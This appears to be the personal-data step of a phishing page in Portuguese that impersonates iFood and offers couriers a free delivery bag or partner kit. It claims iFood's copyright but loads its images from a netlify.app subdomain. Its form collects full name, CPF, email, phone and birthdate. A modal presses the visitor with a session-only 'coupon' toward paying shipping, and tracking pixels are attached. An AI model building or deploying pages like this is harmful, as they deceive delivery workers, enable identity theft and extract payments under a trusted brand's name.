<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
  <meta name="theme-color" content="#EA1D2C">
  <title>iFood Entregador - Dados pessoais</title>
  <meta name="description" content="Informe seus dados para continuar o resgate do kit parceiro iFood.">
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;500;700&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="style.css">
</head>
<body data-page="personal">

  <header class="header">
    <div class="logo-container">
      <img
        src="https://resgate-sua-bag.netlify.app/assets/ifoodentregadores.webp"
        alt="iFood Entregador"
        class="ifood-logo ifood-logo--wide"
      >
    </div>
  </header>

  <noscript class="no-js">Para continuar, ative o JavaScript no navegador.</noscript>

  <main class="container">
    <section class="step" aria-hidden="false">
      <div class="step-header">
        <span class="step-count">Seus Dados</span>
        <div class="progress-bar">
          <div class="progress" style="width: 55%"></div>
        </div>
      </div>

      <h2>Dados de Identificação</h2>
      <p>Precisamos identificar você para vincular a Bag ao seu CPF.</p>

      <div id="personal-error" class="form-error hidden" role="alert"></div>

      <form id="personal-form" class="data-form" novalidate>
        <div class="input-group">
          <input type="text" id="fullname" class="floating-input" placeholder=" " required autocomplete="name" spellcheck="false">
          <label for="fullname" class="floating-label">Nome Completo</label>
        </div>

        <div class="input-group">
          <input type="tel" id="cpf" class="floating-input" placeholder=" " maxlength="14" inputmode="numeric" autocomplete="off" required>
          <label for="cpf" class="floating-label">CPF</label>
        </div>

        <div class="input-group">
          <input type="email" id="email" class="floating-input" placeholder=" " required autocomplete="email">
          <label for="email" class="floating-label">E-mail</label>
        </div>

        <div class="input-group">
          <input type="tel" id="phone" class="floating-input" placeholder=" " maxlength="15" inputmode="numeric" autocomplete="tel" required>
          <label for="phone" class="floating-label">Telefone</label>
        </div>

        <div class="input-group">
          <input type="tel" id="birthdate" class="floating-input" placeholder=" " maxlength="10" inputmode="numeric" autocomplete="bday" required>
          <label for="birthdate" class="floating-label">Data de Nascimento</label>
        </div>

        <div class="action-stack">
          <button type="submit" class="btn-primary">Continuar</button>
        </div>
      </form>
    </section>
  </main>

  <div id="toast" class="toast hidden" role="status" aria-live="polite"></div>

  <!-- Modal de cupom (aparece ao "recusar"/voltar) → CTA leva ao vídeo -->
  <div id="coupon-modal" class="modal hidden" role="dialog" aria-modal="true" aria-labelledby="coupon-title">
    <div class="modal-card">
      <div class="coupon-hero">
        <img
          src="https://resgate-sua-bag.netlify.app/assets/bagfoto.webp"
          alt="Bag iFood com desconto"
        >
      </div>
      <span id="coupon-badge" class="modal-badge">CUPOM EXCLUSIVO</span>
      <h3 id="coupon-title">Desconto liberado no frete</h3>
      <p id="coupon-message">Você ganhou R$ 5,00 de desconto no frete da Bag.</p>
      <span id="coupon-subtitle" class="coupon-subtitle">Oferta valida agora nesta sessao</span>
      <button id="btn-coupon-apply" class="btn-primary" type="button">
        Usar cupom e pagar mais barato
      </button>
    </div>
  </div>

  <footer class="footer">
    <p>&copy; 2026 iFood. Todos os direitos reservados.</p>
  </footer>

  <script src="meta-pixel-config.js"></script>
  <script src="script-meta-pixel.js"></script>
  <script src="tiktok-pixel-config.js"></script>
  <script src="script-tiktok-pixel.js"></script>
  <script src="script-utms.js" defer></script>
  <script src="script-dados.js" defer></script>
</body>
</html>
